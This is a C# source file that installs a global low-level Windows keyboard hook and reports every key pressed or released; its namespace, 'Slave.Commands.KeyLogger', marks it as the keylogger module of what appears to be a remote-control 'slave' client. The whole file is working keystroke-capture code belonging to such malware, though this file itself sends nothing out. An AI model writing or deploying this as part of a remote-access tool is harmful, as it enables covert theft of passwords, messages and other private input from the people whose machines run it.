using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace Slave.Commands.KeyLogger
{
    /// <summary>
    /// Class used to create low level keyboard hooks,
    /// taken from https://github.com/rvknth043/Global-Low-Level-Key-Board-And-Mouse-Hook
    /// </summary>
    internal class KeyboardHook
    {
        /// <summary>
        /// Internal callback processing function
        /// </summary>
        delegate IntPtr KeyboardHookHandler(int nCode, IntPtr wParam, IntPtr lParam);
        KeyboardHookHandler hookHandler;

        /// <summary>
        /// Function that will be called when defined events occur
        /// </summary>
        /// <param name="keyPressed">VKeys</param>
        public delegate void KeyboardHookCallback(string keyPressed);

        public event KeyboardHookCallback KeyDown;
        public event KeyboardHookCallback KeyUp;

        /// <summary>
        /// Hook ID
        /// </summary>
        IntPtr hookID = IntPtr.Zero;

        public bool listening = false;

        /// <summary>
        /// Install low level keyboard hook
        /// </summary>
        public void Install()
        {
            hookHandler = HookFunc;
            hookID = SetHook(hookHandler);
        }

        /// <summary>
        /// Remove low level keyboard hook
        /// </summary>
        public void Uninstall()
        {
            UnhookWindowsHookEx(hookID);
        }

        /// <summary>
        /// Registers hook with Windows API
        /// </summary>
        /// <param name="proc">Callback function</param>
        /// <returns>Hook ID</returns>
        IntPtr SetHook(KeyboardHookHandler proc)
        {
            using (ProcessModule module = Process.GetCurrentProcess().MainModule)
                return SetWindowsHookEx(13, proc, GetModuleHandle(module.ModuleName), 0);
        }

        /// <summary>
        /// Default hook call, which analyses pressed keys
        /// </summary>
        IntPtr HookFunc(int nCode, IntPtr wParam, IntPtr lParam)
        {
            // Only process if listening
            if (listening)
            {
                if (nCode >= 0)
                {
                    int iwParam = wParam.ToInt32();

                    if ((iwParam == WM_KEYDOWN || iwParam == WM_SYSKEYDOWN))
                        KeyDown?.Invoke(KeyboardKeys.VKeys[Marshal.ReadInt32(lParam)]);
                    if ((iwParam == WM_KEYUP || iwParam == WM_SYSKEYUP))
                        KeyUp?.Invoke(KeyboardKeys.VKeys[Marshal.ReadInt32(lParam)]);
                }
            }

            return CallNextHookEx(hookID, nCode, wParam, lParam);
        }

        /// <summary>
        /// Destructor. Unhook current hook
        /// </summary>
        ~KeyboardHook()
        {
            Uninstall();
        }

        /// <summary>
        /// Low-Level function declarations
        /// </summary>
        #region WinAPI
        private const int WM_KEYDOWN = 0x100;
        private const int WM_SYSKEYDOWN = 0x104;
        private const int WM_KEYUP = 0x101;
        private const int WM_SYSKEYUP = 0x105;

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, KeyboardHookHandler lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
        #endregion WinAPI
    }
}
